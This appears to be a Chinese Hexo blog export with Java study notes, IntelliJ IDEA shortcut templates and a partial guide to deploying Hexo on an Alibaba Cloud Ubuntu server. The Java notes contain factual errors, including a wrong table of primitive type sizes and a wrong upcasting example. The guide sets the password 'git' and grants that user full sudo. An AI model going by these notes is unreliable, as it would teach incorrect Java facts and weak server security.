    <url>/%E7%9F%A5%E8%AF%86%E6%A0%91/JAVA/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>语言学习笔记</p>
<span id="more"></span>

<h1 id="基础知识篇"><a href="#基础知识篇" class="headerlink" title="基础知识篇"></a>基础知识篇</h1><p>JAVA是一个强语言类型，<mark>切区分大小写！</mark></p>
<ul>
<li>public –&gt;表示公开的</li>
<li>static –&gt;表示静态的</li>
<li>void    –&gt;表示空</li>
<li>main    –&gt;主方法</li>
<li>class    –&gt;表示定义一个类</li>
</ul>
<p>简单程序示例</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sL8zdA.png"></p>
<ol>
<li>一个JAVA源文件可以定义多个class</li>
<li>一个JAVA源文件当中的public的class不是必须定义的<mark>public定义的class名字必须与类名一致，所有一个包中的一个公开的类只能有一个</mark></li>
<li>一个class会定义，或者产生一个xxx.class字节码文件（储存代码片段）</li>
</ol>
<p><img src="https://s3.ax1x.com/2021/01/25/sLGYw9.png"></p>
<p>命名法<br>类名，接口名：首字母大写，其余小写<br>变量名，方法名：首字母小写，其余大写<br>常量名：全部大写<br>要见名知意，遵守驼峰命名法<br>驼峰命名法：当命名要用2个及其以上单词时，用下划线或者首字母大写分开<br>写代码要符合规范，加空格的位置要注意加</p>
<ol>
<li>小容量转换成大容量，称为自动类型转换机制</li>
<li>long2&#x3D;123486453486L加L是说明是8字节<br>大容量转换成小容量加强制转换类型符，但是会损失精度 –&gt;int y &#x3D; (int) x</li>
</ol>
<p>注释<br>与C一样，但是如</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 比较专业的注释方法，该注释信息会被javacloc.exe工具解析</span></span><br><span class="line"><span class="comment"> * 提取并生成帮助文档(即说明书)</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>占用空间</p>
<ol>
<li>byte————  2 [-128~127]</li>
<li>short————4</li>
<li>int————8</li>
<li>long————4</li>
<li>float————4</li>
<li>doubie————8</li>
<li>boolean————1</li>
<li>char————2  [0~655302]</li>
</ol>
<p>三元运算符&#x2F;三目运算符&#x2F;条件运算符<br>语法规则<br>布尔表达式？表达式：表达式2</p>
<p>逻辑运算符要去两边都是布尔类型</p>
<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><ol>
<li>方法体中不能在定义方法</li>
<li>方法体定义在类体中</li>
<li>规范；一个java文件只定义一个class</li>
<li>return后面不能放代码</li>
</ol>
<p>在JVM内存划分上有三块主要内存空间</p>
<ol>
<li>方法体内存</li>
<li>栈内存</li>
<li>堆内存</li>
</ol>
<p>1，方法片段属于class字节码文件的一部分，字节码文件在类加载的时候，将其存放在方法区中。所以JVM中的三块主要内存中方法区内存最先有数据。存放了代码片段。<br>2，代码片段虽然在方法区内存当中存有片段只有一份，但是可以被重复调用。每一次调用这个方法的时候，需要给该方法分配独立的活动场所，在栈内存中分配。<br>3，方法在调用的瞬间，会给该方法分配内存空间，会在栈中发生压栈动作，方法结束后給该方法分配内存空间收回，方法结束压栈。</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sLJnne.png"></p>
<p>压栈：给该方法分配内存空间<br>弹栈：释放该方法内存空间<br>栈帧：永远指向栈顶元素<br>  栈顶元素处于活跃状态，其他元素静止<br>栈数据结构，存储数据结构特点<br>遵守：先进后出，后进先出</p>
<p>方法重载<br>功能相似，尽可能让方法名相同<br>只和方法名+参数列表有关系<br>方法名可以相同，但是其内的参数类型要不同</p>
<p>方法的递归调用<br>1，方法自身调用自身<br>2，递归必须有结束条件，没有结束条件一定会发生，栈内存溢出错误<br>3，即使有结束条件，也有可能发生栈内存溢出错误，因为递归太深了</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sLNQAJ.png"></p>
<p>弹栈时逐级相加</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sLYwrD.png"></p>
<h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><p><mark>优点：耦合度低，扩展力强。更容易解决现实世界中更复杂的业务逻辑</p>
<p>缺点：前期投入成本高，需要进行独立体的抽取，大量系统分析与设计</p>
<p>关注点是对象（独立体）能完成那些的功能</p>
<p>C语言纯面向过程，c++半面向对象，java纯面向对象</p>
<p>人在认识世界通常以面向对象的方式<br></mark></p>
<p>三大特征<br>—封装<br>—继承<br>—多态</p>
<p>采用面向对象的方式开发一个软件，生命周期当中<br>—面向对象的分析：OOA<br>—面向对象的设计：OOD<br>—面向对象的编程：OOP</p>
<h1 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h1><p>类：类现在现实世界中是不存在的一个模板，是一个概念。是人类大脑抽象的结果<br>类代表了一类事物<br>在现实世界当中，对象A与对象B之间具有的共同特征，进行抽象总结出了一个模板。这个模板被称为类</p>
<p>对象：对象是实际存在的个体，现实世界当中实际存在。</p>
<p><mark>类–&gt;【实例化】–&gt;对象–&gt;【抽象】–&gt;类</mark></p>
<p><mark>注意<br>状态和动作特征当具体到某一个对象后，发现最终结果可能不一样。<br>对象和对象之间有共同的特征，但是具体到对象以后有数据差异</mark></p>
<p>类的定义<br>[修饰符列表]class 类名{<br>属性;<br>方法;<br>}<br>属性通常采用一个变量的形式来定义</p>
<p>JAVA语言中所有class都属于引用数据类型<br>类体 &#x3D; 属性 + 方法<br>实例变量：不能通过类直接访问<br>对象又被称为实例，实例变量又被称为对象变量（对象级别变量）<br>实例化对象的语法：new 类名（）<br>new运算符的作用是创建对象，在JVM堆内存当中开辟新内存空间<br>堆内存：new的对象在堆内存中的存储</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sLtuFA.png"></p>
<p>在对象中分边定义两个引用，分边指向两个对象，则知其也知其二</p>
<p>局部变量：方法体中声明<br>成员变量：方法体外声明<br>实例变量：前边修饰符无static<br>静态变量：前边修饰符有sta</p>
<p>三块内存当中变化最频繁的是栈内存，最先有数据的是方法去内存，垃圾回收器主要针对的是堆内存。</p>
<p>垃圾回收器（自动回收垃圾机制，GC机制）<br>当堆内存中的Java对象称为垃圾数据时候，会被垃圾回收器回收。</p>
<p>堆内存中的java对象变成垃圾的条件<br>没有更多的引用指向它的时候<br>这个对象无法被访问，因为访问对象只能通过引用方式访问</p>
<p>静态变量存储在方法区内存当中<br>一个线程，一个栈内存<br>栈中主要存储方法体的局部变量</p>
<h1 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h1><ol>
<li><p>构造方法又被称为构造函数&#x2F;构造器</p>
</li>
<li><p>构造方法语句<br>[修饰符列表]构造方法名（形式参数列表）{<br>方法体；<br>}</p>
</li>
<li><p>对于构造方法来说，“返回类型不需要指定，并且也不能写void”，写上了就变成普通方法了</p>
</li>
<li><p>调用：new 构造方法名（实参列表）<br>构造方法的方法名与类名保持一致</p>
</li>
<li><p>构造方法有返回值，并且返回值类型是构造方法所在类的类型</p>
</li>
<li><p>当一个类中没有定义任何构造方法的话，系统默认给该类提供一个无参数的构造方法，这个构造方法被称为缺省构造器</p>
</li>
<li><p>构造方法支持重载机制</p>
</li>
<li><p>当一个类现实的构造方法定义了出来，那么系统不在为这个类提供缺省构造器。！！!开发时手动为当前类提供无参数构造方法。因为无参构造方法太常用了</p>
</li>
<li><p>实例变量没有手动赋值的时候系统默认赋值，类加载了代码片段，还没来的及创建对象。所有此时实例变量没有初始化</p>
</li>
</ol>
<h1 id="参数的传递"><a href="#参数的传递" class="headerlink" title="参数的传递"></a>参数的传递</h1><p>参数传递实际上传递的是变量中保持的具体值（字面值或者内存地址）</p>
<h1 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h1><ol>
<li>this是一个引用，this是一个变量，this变量中保存了内存地址指向了自身，this存储在JVM堆内存JAVA对象内部。</li>
<li>this代表当前正在执行这个行为的对象，当对象C1时，this是C1，当对象C2时this是C2</li>
<li>创建100个java对象，就有100this</li>
<li>this可以出现在实例方法当中，this指向当前正在执行这个动作的对象（this代表当前对象）</li>
<li><mark>this多数情况下都可以不写</mark></li>
<li>this不能再tsatic中使用</li>
</ol>
<p>在带siatic的方法中不能直接访问实例变量，实例方法。<br>因为实例变量和实例方法都需要变量的存在<br>而sitaic方法当中是没有this的。也就是说当前对象是不存在的<br>自然也是无法访问当前对象的实例变量和实例方法</p>
<p><mark>“类名.”可以省略</mark></p>
<ol>
<li><p>this.  –&gt;什么时候不能省略<br>用来区分局部变量和实例变量的时候，”this.”不能省略</p>
</li>
<li><p>this可以在那里使用<br>一，可以使用在实例方法当中，代表当前对象<br>二，可以使用在构造方法当中，通过当前的构造方法调用其他的构造方法【语法格式：this(实参)】</p>
</li>
</ol>
<p>在封装的地方”this.”再在构造函数处一模一样的”this.”——并不是无意义的，当你想修改对象的值的时候。</p>
<h1 id="static关键字"><a href="#static关键字" class="headerlink" title="static关键字"></a>static关键字</h1><p>什么时候成员变量声明为实例变量<br>所以对象都有这个属性，但这个属性的值会随着对象的变化而变化【不同对象的这个值不同】</p>
<p>什么时候成员变量声明为静态变量<br>所以对象都有这个属性，并且所有对象的这个属性的值是一样的，建议定义为静态变量，节省内存的开销。</p>
<p><mark>静态变量在类加载的时候初始化，内存在方法区中开辟。访问的时候不需要创建对象，直接使用”类名.静态变量名”的方式访问</mark></p>
<ol>
<li>可以使用static关键字来定义”静态代码块”：<br>语法规则：<br>static{<br>java语句;<br>}</li>
<li>静态代码块在类加载时执行，并且只执行一次</li>
<li>静态代码块在一个类中可以加载多个，并且遵循自上而下的顺序依次执行</li>
<li>静态代码块的作用是什么？怎么用？用在那儿？什么时候用？</li>
</ol>
<p>—这当然和具体的需要有关，例如项目中要求在类加载的时刻&#x2F;时机执行代码完成日志的记录，那么这段代码日志的代码就可以编写到静态代码块当中，完成日志。</p>
<p>—静态代码块是java为程序员准备的一个特殊时刻，这个特殊的时刻被称为类加载时刻。若希望在此刻执行一段特殊的程序，这段程序可以直接放到静态代码块当中</p>
<ol start="5">
<li>通常在静态代码块当中完成预备工作，先完成数据的准备工作，例如：初始化连接池，解析XML配置文件</li>
</ol>
<h1 id="实例语句块"><a href="#实例语句块" class="headerlink" title="实例语句块"></a>实例语句块</h1><p>实例语句块&#x2F;代码块</p>
<ol>
<li>实例代码块可以编写多个，也是遵循自上而下的顺序依次执行。</li>
<li>实例代码块在构造方法执行之前执行，构造方法一次执行，实例代码块对于执行一次。</li>
<li>实例代码块也是java语言为程序员准备一个特殊的时机，这个特殊时机被称为：对象初始化时机</li>
</ol>
<h1 id="方法的覆盖"><a href="#方法的覆盖" class="headerlink" title="方法的覆盖"></a>方法的覆盖</h1><ol>
<li>方法覆盖又叫方法的重写</li>
</ol>
<p>需要使用的情况<br>2. 当父类中的方法已经无法满足当前子类的需求，子类有必要将父类中继承过来的方法进行重新编写，这个重新编写的过程称为方法重写&#x2F;方法覆盖。</p>
<p>代码满足的时候发生代码重写<br>3. 一，方法重写发生在具有继承关系的父子类之间<br>二，返回值类型相同，方法名相同，形参列表相同</p>
<ol start="4">
<li><p>方法重新的时候用复制粘贴</p>
</li>
<li><p>访问权限不能低，可以更高</p>
</li>
<li><p>抛出的异常不能更多可以更少。</p>
</li>
<li><p>注意<br>私有方法不能继承，所以不能覆盖。<br>构造方法不能继承，所以不能覆盖。<br>静态方法不能继承，所以不能覆盖。<br>覆盖只针对方法，不谈属性。</p>
</li>
</ol>
<h1 id="java语言的三大特征"><a href="#java语言的三大特征" class="headerlink" title="java语言的三大特征"></a>java语言的三大特征</h1><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>封装的好处：<br>1，封装之后，对于那个实物来说，看不到这个事物复杂的一面，只能看到事物简单的一面，复杂性封装，对外提供简单的操作入口<br>2，封装之后形成真正的对象，真正的独立体<br>3，封装意味着以后的程序可以重复使用。并且这个是我应该适应性比较强。在任何场合都可以使用<br>4封装以后，对于事物本身提高了安全级别</p>
<p>封装的步骤：<br>1，对所有属性私有化，使用private修饰词<br>2，对外提供简单访问入口<br>get–&gt;输出<br>Set–&gt;修改</p>
<p><mark>&#x2F;，settre 与 getter方法没有static关键字<br>有static关键字修饰的方法调用：类名，方法名（实参）<br>无static关键字修饰的方法调用：引用，方法名（实参）</mark></p>
<p>IDEA中直接一键封装</p>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>Java语言中的继承</p>
<ol>
<li>继承是面向对象三大特征之一</li>
<li>继承”基本”的作用是：代码复用。但是继承最”重要”的是：有了继承才有了以后，方法的覆盖和多态机制</li>
<li>java语言中继承只支持单继承，一个类不能同时继承很多类，只能继承一个类，在C++支持多继承</li>
<li>关于继承中的一些术语<br>B类继承A类，其中：<br>A类称为：父类，基类，超类，superclass<br>B类称为：子类，派生类，subclass</li>
<li>在java语言当中子类继承父类都继承那些数据呢？<br>—私有的不支持继承<br>—构造方法不支持继承<br>—其他数据都可以被继承</li>
<li>虽然java语言当中只支持单继承但是一个类也可以间接继承其他类，例如：<br>C extends b{<br>}<br>B extends  A{<br>}<br>A extends T{<br>}<br>C类间直继承B类，但是C类间接继承TA类</li>
<li>java语言中假设一个类没有显示的任何继承类，该类默认继承javaSE库当中提供的java.lang.Object类</li>
</ol>
<p>子类继承父类的所有属性和方法，但是不能直接访问private</p>
<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>java语言中的多态语法机制<br>1.ABC三个类之间的关系：<br>B类继承A类<br>C类继承A类<br>B，C之间没有任何继承关系</p>
<p>2.关于多态中涉及到的几个概念</p>
<p>向上转型（upcasting）                             B b2 &#x3D; new A<br>子类型 –&gt;父类型<br>又被称为：自动类型转换</p>
<p>向下转型（downcasting）<br>父类型–&gt;子类型<br>又被称为：强制类型转换【需要加强制类型转换符】</p>
<p><mark>无论是向上转型还是向下转型，两种类型之间必须要用继承关系。<br>没有继承关系，程序是无法编译通过的</mark></p>
<ol>
<li>Java程序永远都分为编译阶段和运行阶段</li>
<li>先分析编译阶段，在分析运行阶段，编译无法通过，根本是无法运行的A。class</li>
</ol>
<p>A a2 &#x3D; new B</p>
<p>静态绑定，编译过程中绑定，静态绑定之后才有后续运行</p>
<ol start="3">
<li>在程序运行阶段，JVM堆内存中真实绑定的是B对象，那么以下程序在运行阶段一定会调用B对象的方法，此时发生了动态绑定，运行阶段绑定。</li>
</ol>
<p><mark>底层是什么对象就调对象的什么方法</mark></p>
<ol start="4">
<li>父类型引用指向子类型对象这种机制导致程序存在编译阶段绑定和运行阶段绑定两种不同的形态&#x2F;状态，这种机制可以成为一种多态语法机制</li>
</ol>
<p>需要向下转型的时候<br><mark>当调用的方法是子类型中特有的，在父类型当中不存在，必须向下转型</mark></p>
<p>用强制转换类型，向下转型，程序虽然通过了，但是程序在运行阶段会出现异常，因为JVM堆内存当中真实存在的对象是Bird类型，Bird对象无法转换成Cat对象，因为两种类型之间不存在任何继承关系，此时出现了著名的异常：</p>
<ul>
<li><pre><code>  java.lang.classcastexception
</code></pre>
</li>
<li>类型转换异常，这种异常总是在”向下转型”的时候会发生<blockquote>
<p>次异常只会出现在”向下转型”，说明”向下转型”存在隐患（编译过了，但是存在运行错误）</p>
</blockquote>
</li>
</ul>
<p>1，向上转型只有编译过了，运行一定不会出问题<br>2，向下转型编译过了，运行可能存在错误</p>
<p>避免向下转型出现的异常</p>
<p>使用instanceof运算符可以避免次异常</p>
<p>instanceof语法格式：引用 instanceof 数据类型名<br>以上运算符的执行结果是布尔类型，结果可能是true&#x2F;false</p>
<p>关于运算结果true&#x2F;false<br>假设：（a instanceof Animal）<br>true表示<br>a这个引用指向的一个对象是一个Animal类型<br>false表示<br>a这个引用指向的一个对象不是一个Animal类型</p>
<p>在使用强制类型转换符之前，使用instanceof运算符进行判断，避免classcastexception异常发生</p>
]]></content>
      <categories>
        <category>语言学习总结</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA快捷生成代码</title>
    <url>/JAVA/IDEA%E5%BF%AB%E6%8D%B7%E7%94%9F%E6%88%90%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>准备吧JAVA作为主要使用语言写POC，所有记一下</p>
<span id="more"></span>

<h1 id="psvm"><a href="#psvm" class="headerlink" title="psvm"></a>psvm</h1><pre><code>//生成main方法:
public static void main(String[] args) &#123;&#125;
</code></pre>
<h1 id="sout"><a href="#sout" class="headerlink" title="sout"></a>sout</h1><pre><code>//生成打印输出:
System.out.println();
</code></pre>
<h1 id="“abc”-sout"><a href="#“abc”-sout" class="headerlink" title="“abc”.sout"></a>“abc”.sout</h1><pre><code>//生成打印字符串:
System.out.println(&quot;adc&quot;);
</code></pre>
<h1 id="“abc”-format"><a href="#“abc”-format" class="headerlink" title="“abc”.format"></a>“abc”.format</h1><pre><code>//生成字符串格式化:
String.format(&quot;abc&quot; )
</code></pre>
<h1 id="itli"><a href="#itli" class="headerlink" title="itli"></a>itli</h1><pre><code>    //生成for循环
 for (int i = 0; i &lt; list.size(); i++) &#123;
    String s =  list.get(i);
 &#125;
</code></pre>
<h1 id="itco"><a href="#itco" class="headerlink" title="itco"></a>itco</h1><pre><code>   /// 生成Collection迭代器
 for (Iterator&lt;String&gt; iterator = list.iterator(); iterator.hasNext(); ) &#123;
     String next =  iterator.next();   
 &#125;
</code></pre>
<h1 id="iter"><a href="#iter" class="headerlink" title="iter"></a>iter</h1><pre><code>   ///生成增强for循环
 for (String s : list) &#123;       
 &#125;
</code></pre>
<h1 id="iten"><a href="#iten" class="headerlink" title="iten"></a>iten</h1><pre><code>    ///生成 enumeration遍历
 while (enumeration.hasMoreElements()) &#123;
    Object nextElement =  enumeration.nextElement();   
 &#125;
</code></pre>
<h1 id="itar"><a href="#itar" class="headerlink" title="itar"></a>itar</h1><pre><code>    ///生成数组for循环
 int[] array = &#123;12345&#125;;
 for (int i = 0; i &lt; array.length; i++) &#123;
    int i1 = array[i]; 
 &#125;
</code></pre>
<h1 id="itit"><a href="#itit" class="headerlink" title="itit"></a>itit</h1><pre><code>  ///生成迭代器 iterator
 Iterator iterator = list.iterator();
 while (iterator.hasNext()) &#123;
    Object next =  iterator.next();
 &#125;
</code></pre>
<h1 id="ittok"><a href="#ittok" class="headerlink" title="ittok"></a>ittok</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   //ittok  生成String token遍历</span><br><span class="line">for (StringTokenizer stringTokenizer = new StringTokenizer(APP_NAME); stringTokenizer.hasMoreTokens(); ) &#123;</span><br><span class="line">   String s = stringTokenizer.nextToken();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="itws"><a href="#itws" class="headerlink" title="itws"></a>itws</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成Axis2 web service调用</span><br><span class="line">try &#123;</span><br><span class="line">    MyServiceLocator locator = new MyServiceLocator();</span><br><span class="line">    Activator service = locator.get();</span><br><span class="line">    // If authorization is required</span><br><span class="line">    //((MyService_Soap_BindingStub)service).setUsername(&quot;user3&quot;);</span><br><span class="line">    //((MyService_Soap_BindingStub)service).setPassword(&quot;pass3&quot;);</span><br><span class="line">    // invoke business method</span><br><span class="line">    service.businessMethod();</span><br><span class="line">&#125; catch (javax.xml.rpc.ServiceException ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">&#125; catch (java.rmi.RemoteException ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="try-如-”abc”-try"><a href="#try-如-”abc”-try" class="headerlink" title="try 如:”abc”.try"></a>try 如:”abc”.try</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/// 生成try.....catch</span><br><span class="line">     try &#123;</span><br><span class="line">         &quot;abc&quot;</span><br><span class="line">     &#125; catch (Exception e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<h1 id="ifn"><a href="#ifn" class="headerlink" title="ifn"></a>ifn</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成判断是否为空  </span><br><span class="line">  if (list == null) &#123;</span><br><span class="line">  &#125;2</span><br></pre></td></tr></table></figure>

<h1 id="inn"><a href="#inn" class="headerlink" title="inn"></a>inn</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成判断是否不为空  </span><br><span class="line"> if (list != null) &#123;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h1 id="fori"><a href="#fori" class="headerlink" title="fori"></a>fori</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成简单for循环</span><br><span class="line">  for (int i = 0; i &lt; ; i++) &#123; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h1 id="inst"><a href="#inst" class="headerlink" title="inst"></a>inst</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成是否是该对象引用</span><br><span class="line"> if (list instanceof Object) &#123;</span><br><span class="line">      Object o = (Object) list; </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h1 id="psf"><a href="#psf" class="headerlink" title="psf"></a>psf</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成 共有 静态最终的</span><br><span class="line"> public static final</span><br></pre></td></tr></table></figure>

<h1 id="psfi"><a href="#psfi" class="headerlink" title="psfi"></a>psfi</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成 共有 静态最终的 int</span><br><span class="line"> public static final int </span><br></pre></td></tr></table></figure>

<h1 id="psfs"><a href="#psfs" class="headerlink" title="psfs"></a>psfs</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成 共有 静态最终的 String</span><br><span class="line"> public static final String </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>语言学习总结</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo部署到阿里云服务器</title>
    <url>/bolg/hexo%E9%83%A8%E7%BD%B2%E5%88%B0%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>域名还没下来，就先用gitee，但是先记录一下自己hexo部署过程o(<em>￣▽￣</em>)o</p>
</blockquote>
<span id="more"></span>

<blockquote>
<p>这里说一下vim的基本操作方便不会的同学进行搭建<br>i–&gt;编辑<br>按一下ESC输入:wq–&gt;保存并退出（冒号也要输入啊！）<br>按一下ESC输入:!wq–&gt;保存并强制退出</p>
</blockquote>
<h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ul>
<li>本地hexo构建可运行发布</li>
<li>阿里云服务器能访问</li>
<li>有一个域名(非必须项，可以公网ip查看嘛~)</li>
<li>Xshell和Xftp且已连接至服务器（怎么连接自行百度，这里就不做过多讲解）</li>
</ul>
<h3 id="服务器环境"><a href="#服务器环境" class="headerlink" title="服务器环境"></a>服务器环境</h3><ul>
<li>Ubantu 20.04</li>
</ul>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
<li>回顾一下Hexo发布到gitee（Pages）的流程：</li>
<li>本地计算机用Hexo构建静态文件public</li>
<li>关键一步就是git上传github或gitee</li>
<li>发布Pages将仓库目录<a href="https://gitee.com/cungudafa/cungudafa/index.html%E6%8B%89%E5%8F%96%E5%88%B0https://cungudafa.gitee.io/index.html">https://gitee.com/cungudafa/cungudafa/index.html拉取到https://cungudafa.gitee.io/index.html</a></li>
</ul>
<p><img src="https://s3.ax1x.com/2020/12/06/DXOrtg.png"><br>当然我们需要上传的是public文件夹；每次xftp手动上传肯定是不现实且麻烦的，所以我们接下来要在服务器安装git。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="服务器创建服务器创建git用户"><a href="#服务器创建服务器创建git用户" class="headerlink" title="服务器创建服务器创建git用户"></a>服务器创建服务器创建git用户</h3><h4 id="创建一个git用户，用来运行git服务。（root不安全）"><a href="#创建一个git用户，用来运行git服务。（root不安全）" class="headerlink" title="创建一个git用户，用来运行git服务。（root不安全）"></a>创建一个git用户，用来运行git服务。（root不安全）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo useradd git -m</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：Ubantu下必须加上-m，才会自动新建用户目录&#x2F;home&#x2F;git&#x2F;（后面配置和博客文件都放在这里）<br>在&#x2F;home&#x2F;git&#x2F;非常重要，如果出错，可以删除sudo userdel -r git用户，重新之前的步骤。</p>
</blockquote>
<h4 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo passwd git</span><br></pre></td></tr></table></figure>
<p>密码就是git吧，简单为上。</p>
<h4 id="增加git用户执行sudo的权限"><a href="#增加git用户执行sudo的权限" class="headerlink" title="增加git用户执行sudo的权限"></a>增加git用户执行sudo的权限</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 740 /etc/sudoers</span><br><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure>
<p>找到以下内容：root ALL&#x3D;(ALL) ALL在下面添加一行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git     ALL=(ALL)       ALL</span><br></pre></td></tr></table></figure>
<p>保存退出后改回权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 400 /etc/sudoers</span><br></pre></td></tr></table></figure>

<h3 id="服务器打开RSA认证"><a href="#服务器打开RSA认证" class="headerlink" title="服务器打开RSA认证"></a>服务器打开RSA认证</h3><p>RSA用公钥加密，私钥解密，成为加密通信。<br>用私钥加密，公钥解密，就是认证。（这样就能证明消息是你发出的。）<br>因为：公钥大家都有，私钥就只有一个，在你自己手里。<br><img src="https://s3.ax1x.com/2020/12/06/DXzRTP.png"></p>
<h4 id="开启认证配置"><a href="#开启认证配置" class="headerlink" title="开启认证配置"></a>开启认证配置</h4><h5 id="服务器端："><a href="#服务器端：" class="headerlink" title="服务器端："></a>服务器端：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
<p>在sshd_config中开启以下几项：(前两项yes，后一项修改为如下)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile  .ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p>重启sshd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop sshd.service</span><br><span class="line">systemctl start sshd.service</span><br></pre></td></tr></table></figure>
<h4 id="建立ssh信任关系"><a href="#建立ssh信任关系" class="headerlink" title="建立ssh信任关系"></a>建立ssh信任关系</h4><p>本地电脑生成秘钥对-&gt;发送公钥到服务器-&gt;本地可免密连接服务器</p>
<h5 id="在本地电脑-生成密钥对"><a href="#在本地电脑-生成密钥对" class="headerlink" title="在本地电脑:生成密钥对"></a>在本地电脑:生成密钥对</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;邮箱&quot; </span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/DjSY9S.png"><br>成功后，会在c盘用户下新建秘钥对：</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjSrNV.png"></p>
<h5 id="在服务器-切换至git用户，创建-x2F-ssh-文件夹"><a href="#在服务器-切换至git用户，创建-x2F-ssh-文件夹" class="headerlink" title="在服务器:切换至git用户，创建 ~&#x2F;.ssh 文件夹"></a>在服务器:切换至git用户，创建 ~&#x2F;.ssh 文件夹</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">mkdir ~/.ssh</span><br></pre></td></tr></table></figure>
<p>或者root用户直接创建：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/git/</span><br><span class="line">mkdir .ssh</span><br></pre></td></tr></table></figure>

<h5 id="在本地电脑-发送公钥-id-rsa-pub-到-x2F-home-x2F-git-x2F-ssh-x2F-authorzied-keys"><a href="#在本地电脑-发送公钥-id-rsa-pub-到-x2F-home-x2F-git-x2F-ssh-x2F-authorzied-keys" class="headerlink" title="在本地电脑:发送公钥 id_rsa.pub 到 &#x2F;home&#x2F;git&#x2F;.ssh&#x2F;authorzied_keys"></a>在本地电脑:发送公钥 id_rsa.pub 到 &#x2F;home&#x2F;git&#x2F;.ssh&#x2F;authorzied_keys</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-copy-id -i C:/Users/CUNGU/.ssh/id_rsa.pub git@47.93.50.90 //把公钥发送给服务器</span><br><span class="line">ssh git@47.93.50.90 // 测试能否登录</span><br></pre></td></tr></table></figure>
<p>服务器文件夹也有了公钥：</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjpPgg.png"></p>
<h5 id="文件夹权限调整：authorzied-keys权限为600时才生效"><a href="#文件夹权限调整：authorzied-keys权限为600时才生效" class="headerlink" title="文件夹权限调整：authorzied_keys权限为600时才生效"></a>文件夹权限调整：authorzied_keys权限为600时才生效</h5><p>git用户：</p>
